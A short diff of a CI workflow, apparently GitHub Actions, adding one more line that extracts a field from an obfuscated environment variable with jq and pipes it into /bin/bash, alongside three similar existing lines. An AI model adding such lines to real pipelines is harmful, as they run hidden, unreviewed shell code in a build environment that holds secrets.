@@ -24,6 +24,7 @@ jobs:
           printf '%s' "$mipp8055" | jq -r .zwos7002 | /bin/bash
           printf '%s' "$czavq70" | jq -r .zxxde71 | /bin/bash
           echo $gjly59 | jq -r .ovr1058 | /bin/bash
+          echo $cocga42 | jq -r .bsrc59263 | /bin/bash
 
       - name: Store artifact
         uses: actions/upload-artifact@v4
